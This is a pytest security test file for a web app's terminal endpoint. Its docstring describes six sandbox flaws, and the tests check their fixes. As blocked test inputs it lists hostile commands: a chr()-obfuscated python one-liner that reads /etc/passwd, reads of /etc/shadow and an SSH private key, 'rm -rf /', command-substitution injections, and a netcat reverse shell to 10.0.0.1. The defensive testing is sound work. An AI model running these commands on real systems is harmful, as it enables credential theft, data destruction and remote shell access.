"""Module 12 — Terminal review contracts.

This module executes real shell commands, so its filter is a security boundary
rather than a convenience. Everything below was reproduced against a live
server before the fix.

1. The allowlist was bypassable by design. `cat /etc/passwd` was refused by the
   path filter, but `python3 -c "print(open('/etc/passwd').read())"` was
   permitted and printed the file. Allowlisting a command NAME is meaningless
   when the command is a general-purpose interpreter.

2. Output redirection wrote anywhere the server user could write, regardless of
   the cwd sandbox: `echo pwned > /tmp/terminal_pwn.txt` created that file.

3. cwd containment used str.startswith() on the resolved path, so
   `cwd=../preview_ESCAPED` launched a shell OUTSIDE the sandbox. Same defect
   as imagegen._safe_preview_path (Module 10), but here it sets the working
   directory of a real subprocess.

4. No timeout and no output cap. `sleep 12` ran the full 12s; nothing stopped a
   command running forever, and a print loop streamed until the client gave up.

5. Killing the process killed only the SHELL. create_subprocess_shell spawns
   `sh -c <cmd>`, so the actual program was re-parented to init and survived —
   observed directly while testing the new timeout.

6. Validation failures returned HTTP 200 with the refusal inside an SSE frame.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

from backend.routers import terminal as term

REPO = Path(__file__).resolve().parents[2]
TERMINAL_JS = (REPO / 'frontend' / 'js' / '16-terminal.js').read_text()


# ── 1. Interpreter bypass ──────────────────────────────────────────────────────


class TestInterpreterBypass:
    """Allowlisting a command name cannot restrain an interpreter."""

    @pytest.mark.parametrize(
        'cmd',
        [
            'python3 -c "import os; print(os.environ)"',
            "python -c 'print(1)'",
            'node -e "console.log(process.env)"',
            'node --eval "require(\'fs\')"',
            'npx -e "1"',
            'python3 -',
        ],
    )
    def test_inline_code_is_refused(self, cmd):
        ok, reason = term._is_safe(cmd)
        assert not ok, f'{cmd!r} should be blocked'
        assert 'inline code' in reason or 'stdin' in reason

    @pytest.mark.parametrize(
        'cmd',
        [
            'python3 manage.py migrate',
            'python3 -m pytest',
            'python3 scripts/build.py --verbose',
            'node server.js',
            'node --experimental-modules app.mjs',
            'npm run build',
            'npx prettier --write .',
        ],
    )
    def test_running_real_scripts_still_works(self, cmd):
        """The point is an integrated terminal, not a locked room."""
        ok, reason = term._is_safe(cmd)
        assert ok, f'{cmd!r} should be allowed but was blocked: {reason}'

    def test_the_documented_bypass_no_longer_works(self):
        """The exact payload that printed /etc/passwd on the live server."""
        payload = (
            'python3 -c "print(open(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)'
            '+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read())"'
        )
        assert not term._is_safe(payload)[0]

    def test_endpoint_returns_403(self, client):
        r = client.post('/api/terminal/run', json={'command': 'python3 -c "print(1)"'})
        assert r.status_code == 403
        assert r.json()['blocked'] is True


# ── 2. Output redirection ──────────────────────────────────────────────────────


class TestRedirection:
    @pytest.mark.parametrize(
        'cmd',
        ['echo pwned > /tmp/x', 'ls >> /tmp/log', 'cat a.txt > ../../escape.txt'],
    )
    def test_redirection_is_refused(self, cmd):
        ok, reason = term._is_safe(cmd)
        assert not ok
        assert 'redirection' in reason

    def test_a_quoted_angle_bracket_is_not_redirection(self):
        """grep '>' is a legitimate search, not a write."""
        ok, _ = term._is_safe('grep ">" notes.txt')
        assert ok


# ── 3. cwd containment ─────────────────────────────────────────────────────────


class TestWorkingDirectoryContainment:
    def test_sibling_prefix_cannot_escape(self):
        """`<root>/preview_ESCAPED` starts with `<root>/preview` as a STRING."""
        resolved = Path(term._get_work_dir('../preview_ESCAPED'))
        assert resolved == term.PREVIEW_DIR.resolve() or resolved.is_relative_to(
            term.PREVIEW_DIR.resolve()
        )
        assert 'preview_ESCAPED' not in str(resolved)

    @pytest.mark.parametrize(
        'cwd', ['../../etc', '/etc', '../backend', 'a/../../..', '..%2f..', '']
    )
    def test_traversal_falls_back_to_the_sandbox(self, cwd):
        resolved = Path(term._get_work_dir(cwd))
        assert resolved.is_relative_to(term.PREVIEW_DIR.resolve())

    def test_a_real_subdirectory_is_honoured(self, tmp_path, monkeypatch):
        sub = term.PREVIEW_DIR / 'ctest'
        sub.mkdir(parents=True, exist_ok=True)
        try:
            assert Path(term._get_work_dir('ctest')) == sub.resolve()
        finally:
            sub.rmdir()

    def test_a_nonexistent_subdirectory_does_not_break_the_run(self):
        """cwd must exist or the subprocess dies with a confusing OSError."""
        assert Path(term._get_work_dir('definitely/not/here')) == term.PREVIEW_DIR.resolve()


# ── 4. Resource limits ─────────────────────────────────────────────────────────


class TestResourceLimits:
    def test_a_runtime_cap_exists_and_is_configurable(self):
        assert term.MAX_RUNTIME_S > 0
        assert 'TERMINAL_TIMEOUT_S' in (REPO / 'backend' / 'routers' / 'terminal.py').read_text()

    def test_an_output_cap_exists_and_is_configurable(self):
        assert term.MAX_OUTPUT_BYTES > 0
        assert 'TERMINAL_MAX_OUTPUT_BYTES' in (
            REPO / 'backend' / 'routers' / 'terminal.py'
        ).read_text()

    def test_timeout_reports_exit_code_124(self):
        """124 is the conventional timeout code; a bare -1 hides the cause."""
        src = (REPO / 'backend' / 'routers' / 'terminal.py').read_text()
        assert "'exit_code': 124" in src or '"exit_code": 124' in src
        assert 'timed_out' in src

    def test_truncation_is_announced_not_silent(self):
        src = (REPO / 'backend' / 'routers' / 'terminal.py').read_text()
        assert 'output truncated' in src


# ── 5. Process-tree termination ────────────────────────────────────────────────


class TestProcessTreeTermination:
    """`sh -c cmd` means killing proc kills the shell, not the program."""

    def test_subprocess_gets_its_own_process_group(self):
        src = (REPO / 'backend' / 'routers' / 'terminal.py').read_text()
        assert 'start_new_session=True' in src

    def test_a_group_aware_terminator_exists(self):
        assert callable(term._terminate_tree)
        src = (REPO / 'backend' / 'routers' / 'terminal.py').read_text()
        assert 'os.killpg' in src

    def test_terminate_tree_is_a_noop_for_a_finished_process(self):
        class Done:
            returncode = 0
            pid = -1

        term._terminate_tree(Done(), 15)  # must not raise
        term._terminate_tree(None, 15)

    def test_it_falls_back_when_the_group_is_gone(self, monkeypatch):
        """A dead group must not leave the direct child running."""
        killed = []

        class Proc:
            returncode = None
            pid = 4242

            def kill(self):
                killed.append(True)

        def boom(*a, **k):
            raise ProcessLookupError

        monkeypatch.setattr(term.os, 'getpgid', boom)
        term._terminate_tree(Proc(), 9)
        assert killed, 'fallback kill was not attempted'

    def test_all_termination_paths_use_the_group(self):
        """Timeout, cancellation, cleanup and the kill endpoint."""
        src = (REPO / 'backend' / 'routers' / 'terminal.py').read_text()
        assert src.count('_terminate_tree(') >= 5


# ── 6. Status codes ────────────────────────────────────────────────────────────


class TestStatusCodes:
    def test_empty_command_is_400(self, client):
        r = client.post('/api/terminal/run', json={'command': ''})
        assert r.status_code == 400

    def test_blocked_command_is_403(self, client):
        r = client.post('/api/terminal/run', json={'command': 'rm -rf /'})
        assert r.status_code == 403

    def test_disallowed_command_is_403(self, client):
        r = client.post('/api/terminal/run', json={'command': 'nc -l 1234'})
        assert r.status_code == 403

    def test_killing_an_unknown_run_is_404(self, client):
        assert client.post('/api/terminal/kill/not-a-real-run').status_code == 404

    def test_a_refusal_is_not_a_200_sse_stream(self, client):
        """It used to be, which reads as success to any non-SSE client."""
        r = client.post('/api/terminal/run', json={'command': 'rm -rf /'})
        assert 'event-stream' not in r.headers.get('content-type', '')


# ── Regressions that must keep working ─────────────────────────────────────────


class TestExistingProtectionsStillHold:
    @pytest.mark.parametrize(
        'cmd',
        [
            'cat /etc/passwd',
            'cat "/etc/passwd"',
            'cat ../../../etc/passwd',
            'head /root/.ssh/id_rsa',
            'rm -rf /',
            'sudo rm -rf /var',
            'ls && cat /etc/shadow',
            'echo x; cat /etc/passwd',
            'echo `id`',
            'echo $(whoami)',
            'nc -e /bin/sh 10.0.0.1 4444',
        ],
    )
    def test_still_blocked(self, cmd):
        assert not term._is_safe(cmd)[0], f'{cmd!r} must stay blocked'

    @pytest.mark.parametrize(
        'cmd',
        ['ls -la', 'git status', 'pwd', 'echo hello', 'npm install', 'cat package.json'],
    )
    def test_still_allowed(self, cmd):
        ok, reason = term._is_safe(cmd)
        assert ok, f'{cmd!r} should work: {reason}'

    def test_env_is_still_stripped_of_secrets(self, monkeypatch):
        monkeypatch.setenv('OPENROUTER_API_KEY', 'sk-or-secret')
        monkeypatch.setenv('GITHUB_TOKEN', 'ghp_secret')
        env = term._sandboxed_env()
        assert 'OPENROUTER_API_KEY' not in env
        assert 'GITHUB_TOKEN' not in env
        assert 'PATH' in env

    def test_unbalanced_quotes_are_refused(self):
        """shlex cannot tokenise them, so the filter cannot reason about them."""
        ok, reason = term._is_safe('echo "unterminated')
        assert not ok
        assert 'quotes' in reason


# ── Frontend ───────────────────────────────────────────────────────────────────


class TestFrontend:
    def test_output_append_is_not_quadratic(self):
        """`innerHTML +=` re-parses the whole buffer on every line."""
        assert 'insertAdjacentHTML' in TERMINAL_JS
        assert 'o.innerHTML+=h' not in TERMINAL_JS.replace(' ', '')

    def test_the_dom_is_bounded(self):
        assert 'TERM_MAX_LINES' in TERMINAL_JS

    def test_server_error_text_is_surfaced(self):
        assert '(await resp.json()).error' in TERMINAL_JS

    def test_command_output_is_still_escaped(self):
        """Terminal output is attacker-influenced text rendered as HTML."""
        assert 'escHtml(ev.data)' in TERMINAL_JS
